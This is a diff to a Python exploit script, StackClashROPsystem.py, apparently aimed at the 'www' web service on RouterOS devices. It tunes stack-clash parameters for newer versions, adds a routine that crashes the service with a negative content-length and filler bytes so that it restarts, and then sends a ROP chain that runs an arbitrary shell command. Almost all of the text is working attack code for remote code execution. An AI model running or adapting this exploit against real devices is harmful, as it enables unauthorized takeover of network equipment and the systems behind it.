@@ -11,9 +11,10 @@ import socket, time, sys, struct
 from pwn import *
 import ropgadget
 
-AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
-SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
-ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!
+AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
+ROS_STACKSIZE =  0x20000 # newer version of ROS have a different stack size per thread (128 KB)
+SKIP_SPACE    =   0x1000 # 4 KB of "safe" space for the stack of thread 2
+ROP_SPACE     =   0x8000 # we can send 32 KB of ROP chain!
 
 ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
 ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
@@ -97,6 +98,10 @@ def ropSearchJmp(elf, instruction):
 def loadOffsets(binary, shellCmd):
     elf = ELF(binary)
     rop = ROP(elf)
+
+    if len([_ for _ in elf.search("pthread_attr_setstacksize")]) > 0:
+        global AST_STACKSIZE
+        AST_STACKSIZE = ROS_STACKSIZE     
 
     # www PLT symbols
     plt["strncpy"] = elf.plt['strncpy']
@@ -221,6 +226,14 @@ def stackClash(ip, port, ropChain):
 
     print("Done!")
 
+def crash(ip, port):
+    print("Crash...")
+    s = makeSocket(ip, port)
+    socketSend(s, makeHeader(-1))
+    socketSend(s, b'A' * 0x1000)
+    s.close()
+    time.sleep(2.5) # www takes up to 3 seconds to restart
+
 if __name__ == "__main__":
     if len(sys.argv) == 5:
         ip       = sys.argv[1]
@@ -232,6 +245,7 @@ if __name__ == "__main__":
         ropChain = buildROP(binary, shellCmd)
         print("The ROP chain is " + str(len(ropChain)) + " bytes long (" + str(ROP_SPACE) + " bytes available)")
 
+        crash(ip, port) # should make stack clash more reliable
         stackClash(ip, port, ropChain)
     else:
         print("Usage: ./StackClashROPsystem.py IP PORT binary shellcommand")
